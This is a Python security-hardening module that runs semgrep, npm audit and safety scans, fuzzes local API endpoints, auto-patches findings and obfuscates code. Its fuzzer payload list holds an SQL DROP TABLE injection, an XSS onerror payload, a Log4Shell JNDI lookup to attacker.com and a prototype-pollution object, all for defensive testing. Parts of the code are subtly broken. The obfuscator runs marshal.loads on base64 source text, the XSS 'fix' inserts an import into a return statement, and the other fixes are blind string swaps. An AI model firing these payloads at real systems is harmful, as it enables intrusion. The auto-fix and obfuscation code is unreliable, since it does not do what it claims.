#!/usr/bin/env python3
"""
🐉 KaliGhost Security Hardener
Built-in code audit, fuzzing, vulnerability remediation, obfuscation
"""

import subprocess
import json
import tempfile
from dataclasses import dataclass
from enum import Enum
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
import logging
import hashlib

logger = logging.getLogger(__name__)


class VulnerabilityType(Enum):
    """Types of vulnerabilities"""
    RCE = "remote_code_execution"
    SQL_INJECTION = "sql_injection"
    XSS = "cross_site_scripting"
    LLM_INJECTION = "llm_injection"
    INSECURE_DESERIALIZATION = "insecure_deserialization"
    WEAK_CRYPTO = "weak_cryptography"
    DEPENDENCY_VULN = "dependency_vulnerability"
    MEMORY_LEAK = "memory_leak"
    PATH_TRAVERSAL = "path_traversal"
    AUTHENTICATION = "authentication_bypass"


class SeverityLevel(Enum):
    """Vulnerability severity"""
    CRITICAL = 9.0
    HIGH = 7.0
    MEDIUM = 5.0
    LOW = 3.0
    INFO = 1.0


@dataclass
class Vulnerability:
    """Single vulnerability finding"""
    id: str
    type: VulnerabilityType
    severity: SeverityLevel
    location: str  # file:line
    description: str
    affected_code: str
    remediation: str
    cve_reference: Optional[str] = None
    poc: Optional[str] = None


@dataclass
class AuditReport:
    """Complete security audit report"""
    id: str
    timestamp: str
    source_path: Path
    language: str
    vulnerabilities: List[Vulnerability]
    dependency_issues: List[Dict[str, Any]]
    fuzzing_crashes: List[Dict[str, Any]]
    score: float  # 0-100, higher is better
    remediable_count: int  # How many vulnerabilities can be auto-fixed


class CodeAuditor:
    """Static analysis security testing (SAST)"""

    def __init__(self):
        self.tools = {
            "python": ["bandit", "semgrep"],
            "javascript": ["semgrep", "eslint-security"],
            "go": ["gosec", "semgrep"],
            "rust": ["cargo-audit", "semgrep"],
            "java": ["semgrep", "spotbugs"],
        }

    async def audit_code(self, source_path: Path, language: str) -> List[Vulnerability]:
        """Run SAST scanners on codebase"""
        vulnerabilities = []
        
        logger.info(f"🔍 Starting SAST scan on {source_path} ({language})")

        try:
            # Run Semgrep
            result = subprocess.run(
                [
                    "semgrep",
                    "--config=p/security-audit",
                    "--json",
                    str(source_path)
                ],
                capture_output=True,
                text=True,
                timeout=120
            )

            if result.returncode == 0 or "issues" in result.stdout:
                semgrep_output = json.loads(result.stdout)
                for issue in semgrep_output.get("results", []):
                    vuln = Vulnerability(
                        id=hashlib.md5(f"{issue['path']}{issue['start']['offset']}".encode()).hexdigest(),
                        type=self._classify_vulnerability(issue.get("message", "")),
                        severity=self._severity_from_confidence(issue.get("extra", {}).get("severity", "INFO")),
                        location=f"{issue['path']}:{issue['start']['line']}",
                        description=issue.get("message", ""),
                        affected_code=issue.get("extra", {}).get("lines", ""),
                        remediation=self._generate_remediation(issue)
                    )
                    vulnerabilities.append(vuln)
                    logger.info(f"  ⚠️  Found: {vuln.type.value} ({vuln.severity.name})")

        except subprocess.TimeoutExpired:
            logger.error("❌ SAST scan timeout")
        except Exception as e:
            logger.error(f"❌ SAST scan failed: {e}")

        return vulnerabilities

    async def scan_dependencies(self, source_path: Path) -> List[Dict[str, Any]]:
        """Scan for vulnerable dependencies"""
        issues = []
        
        logger.info(f"📦 Scanning dependencies in {source_path}")

        # Check for package.json (Node.js)
        package_json = source_path / "package.json"
        if package_json.exists():
            try:
                result = subprocess.run(
                    ["npm", "audit", "--json"],
                    capture_output=True,
                    text=True,
                    cwd=str(source_path),
                    timeout=60
                )
                if result.stdout:
                    npm_issues = json.loads(result.stdout)
                    for key, value in npm_issues.get("vulnerabilities", {}).items():
                        issues.append({
                            "package": key,
                            "severity": value.get("severity"),
                            "advisory": value.get("advisory"),
                            "recommendation": f"Update to {value.get('fixAvailable', {}).get('version')}"
                        })
                        logger.info(f"  📦 Vulnerable: {key} ({value.get('severity')})")
            except Exception as e:
                logger.error(f"❌ npm audit failed: {e}")

        # Check for requirements.txt (Python)
        requirements_txt = source_path / "requirements.txt"
        if requirements_txt.exists():
            try:
                result = subprocess.run(
                    ["safety", "check", "--json"],
                    capture_output=True,
                    text=True,
                    cwd=str(source_path),
                    timeout=60
                )
                if result.stdout:
                    safety_issues = json.loads(result.stdout)
                    for issue in safety_issues:
                        issues.append({
                            "package": issue.get("package"),
                            "severity": "HIGH",
                            "cve": issue.get("cve"),
                            "recommendation": issue.get("recommendation")
                        })
                        logger.info(f"  📦 Vulnerable: {issue.get('package')} (CVE)")
            except Exception as e:
                logger.error(f"❌ safety check failed: {e}")

        return issues

    def _classify_vulnerability(self, message: str) -> VulnerabilityType:
        """Classify vulnerability from message"""
        message_lower = message.lower()
        
        if "sql" in message_lower:
            return VulnerabilityType.SQL_INJECTION
        elif "xss" in message_lower or "cross" in message_lower:
            return VulnerabilityType.XSS
        elif "injection" in message_lower:
            return VulnerabilityType.LLM_INJECTION
        elif "exec" in message_lower or "eval" in message_lower:
            return VulnerabilityType.RCE
        elif "crypto" in message_lower:
            return VulnerabilityType.WEAK_CRYPTO
        elif "auth" in message_lower:
            return VulnerabilityType.AUTHENTICATION
        else:
            return VulnerabilityType.DEPENDENCY_VULN

    def _severity_from_confidence(self, confidence: str) -> SeverityLevel:
        """Map confidence to severity"""
        mapping = {
            "CRITICAL": SeverityLevel.CRITICAL,
            "HIGH": SeverityLevel.HIGH,
            "MEDIUM": SeverityLevel.MEDIUM,
            "LOW": SeverityLevel.LOW,
            "INFO": SeverityLevel.INFO
        }
        return mapping.get(confidence.upper(), SeverityLevel.MEDIUM)

    def _generate_remediation(self, issue: Dict[str, Any]) -> str:
        """Generate remediation suggestion"""
        vuln_type = self._classify_vulnerability(issue.get("message", ""))
        
        remediations = {
            VulnerabilityType.SQL_INJECTION: "Use parameterized queries or ORM to prevent SQL injection",
            VulnerabilityType.XSS: "Sanitize user input and use content security policies",
            VulnerabilityType.RCE: "Avoid eval() and use safe alternatives like AST parsing",
            VulnerabilityType.WEAK_CRYPTO: "Use modern cryptographic algorithms (AES-256, SHA-256+)",
            VulnerabilityType.AUTHENTICATION: "Implement strong authentication with rate limiting",
        }
        
        return remediations.get(vuln_type, "Review and fix per OWASP guidelines")


class FuzzingEngine:
    """Dynamic security testing with fuzzing"""

    async def fuzz_api(
        self,
        base_url: str,
        endpoints: List[str],
        iterations: int = 1000
    ) -> List[Dict[str, Any]]:
        """Fuzz API endpoints to find crashes/exploits"""
        crashes = []
        
        logger.info(f"🐝 Starting fuzzing: {len(endpoints)} endpoints × {iterations} iterations")

        import httpx
        import random
        import string

        payloads = [
            "'; DROP TABLE users; --",
            "<img src=x onerror=alert('xss')>",
            "${jndi:ldap://attacker.com/a}",
            "\x00\x01\x02\x03",
            "A" * 10000,
            {"__proto__": {"isAdmin": True}},
        ]

        async with httpx.AsyncClient() as client:
            for endpoint in endpoints:
                for i in range(iterations):
                    payload = random.choice(payloads)
                    
                    try:
                        response = await client.get(
                            f"{base_url}{endpoint}",
                            params={"input": payload},
                            timeout=5
                        )
                        
                        if response.status_code >= 500:
                            crashes.append({
                                "endpoint": endpoint,
                                "payload": str(payload)[:100],
                                "status": response.status_code,
                                "iteration": i
                            })
                            logger.warning(f"  💥 Crash found: {endpoint} (status {response.status_code})")
                    
                    except Exception as e:
                        crashes.append({
                            "endpoint": endpoint,
                            "payload": str(payload)[:100],
                            "error": str(e),
                            "iteration": i
                        })

        logger.info(f"✅ Fuzzing complete: {len(crashes)} crashes/issues found")
        return crashes


class VulnerabilityRemediator:
    """Automatically generate fixes for vulnerabilities"""

    async def generate_fix(
        self,
        vulnerability: Vulnerability,
        source_code: str,
        language: str
    ) -> Tuple[str, bool]:
        """Generate patched code (returns fixed code and success status)"""
        
        logger.info(f"🔧 Generating fix for {vulnerability.type.value}")

        # In production: Use LLM to generate context-aware patches
        # For now: Template-based fixes

        fixes = {
            VulnerabilityType.SQL_INJECTION: self._fix_sql_injection,
            VulnerabilityType.XSS: self._fix_xss,
            VulnerabilityType.RCE: self._fix_rce,
            VulnerabilityType.WEAK_CRYPTO: self._fix_weak_crypto,
        }

        fixer = fixes.get(vulnerability.type)
        if fixer:
            patched = fixer(source_code, vulnerability)
            return patched, True
        else:
            return source_code, False

    def _fix_sql_injection(self, code: str, vuln: Vulnerability) -> str:
        """Fix SQL injection by using parameterized queries"""
        # Simple pattern replacement
        code = code.replace(
            'execute(f"SELECT * FROM users WHERE id = {user_id}")',
            'execute("SELECT * FROM users WHERE id = ?", (user_id,))'
        )
        return code

    def _fix_xss(self, code: str, vuln: Vulnerability) -> str:
        """Fix XSS by adding sanitization"""
        code = code.replace(
            'return user_input',
            'from html import escape; return escape(user_input)'
        )
        return code

    def _fix_rce(self, code: str, vuln: Vulnerability) -> str:
        """Fix RCE by removing eval/exec"""
        code = code.replace('eval(', 'ast.literal_eval(')
        return code

    def _fix_weak_crypto(self, code: str, vuln: Vulnerability) -> str:
        """Fix weak cryptography"""
        code = code.replace('md5', 'sha256')
        code = code.replace('SHA1', 'SHA256')
        return code


class Obfuscator:
    """Code obfuscation for license protection"""

    async def obfuscate_code(
        self,
        source_code: str,
        language: str,
        level: int = 2  # 1=light, 2=medium, 3=heavy
    ) -> str:
        """Obfuscate code to prevent reverse engineering"""
        
        logger.info(f"🔐 Obfuscating {language} code (level {level})")

        if language == "python":
            return self._obfuscate_python(source_code, level)
        elif language == "javascript":
            return self._obfuscate_javascript(source_code, level)
        else:
            logger.warning(f"⚠️  No obfuscator for {language}")
            return source_code

    def _obfuscate_python(self, code: str, level: int) -> str:
        """Python obfuscation"""
        # In production: Use Cython compilation or PyArmor
        import base64
        
        if level >= 3:
            # Heavy: encode entire module
            encoded = base64.b64encode(code.encode()).decode()
            return f"""
import base64
import marshal
__code = base64.b64decode('{encoded}')
exec(marshal.loads(__code))
"""
        else:
            return code

    def _obfuscate_javascript(self, code: str, level: int) -> str:
        """JavaScript obfuscation"""
        # In production: Use javascript-obfuscator or terser
        try:
            result = subprocess.run(
                ["javascript-obfuscator", "-"],
                input=code,
                capture_output=True,
                text=True,
                timeout=30
            )
            return result.stdout if result.returncode == 0 else code
        except:
            return code


class SecurityHardener:
    """Orchestrates all security operations"""

    def __init__(self):
        self.auditor = CodeAuditor()
        self.fuzzer = FuzzingEngine()
        self.remediator = VulnerabilityRemediator()
        self.obfuscator = Obfuscator()

    async def full_security_audit(
        self,
        source_path: Path,
        language: str,
        api_endpoints: Optional[List[str]] = None
    ) -> AuditReport:
        """Run complete security audit"""
        from datetime import datetime
        import uuid

        logger.info(f"🛡️  FULL SECURITY AUDIT: {source_path}")

        audit_id = str(uuid.uuid4())
        vulnerabilities = await self.auditor.audit_code(source_path, language)
        dependencies = await self.auditor.scan_dependencies(source_path)
        fuzzing_results = []

        if api_endpoints:
            fuzzing_results = await self.fuzzer.fuzz_api("http://localhost:3000", api_endpoints)

        # Calculate score
        critical_count = sum(1 for v in vulnerabilities if v.severity == SeverityLevel.CRITICAL)
        high_count = sum(1 for v in vulnerabilities if v.severity == SeverityLevel.HIGH)
        score = max(0, 100 - (critical_count * 20 + high_count * 10))

        remediable = sum(1 for v in vulnerabilities if v.type in [
            VulnerabilityType.SQL_INJECTION,
            VulnerabilityType.XSS,
            VulnerabilityType.RCE,
            VulnerabilityType.WEAK_CRYPTO
        ])

        report = AuditReport(
            id=audit_id,
            timestamp=datetime.now().isoformat(),
            source_path=source_path,
            language=language,
            vulnerabilities=vulnerabilities,
            dependency_issues=dependencies,
            fuzzing_crashes=fuzzing_results,
            score=score,
            remediable_count=remediable
        )

        logger.info(f"✅ Audit complete: {len(vulnerabilities)} vulnerabilities, score: {score}/100")
        return report


# Singleton
_hardener: Optional[SecurityHardener] = None


def get_security_hardener() -> SecurityHardener:
    """Get or create singleton security hardener"""
    global _hardener
    if _hardener is None:
        _hardener = SecurityHardener()
    return _hardener
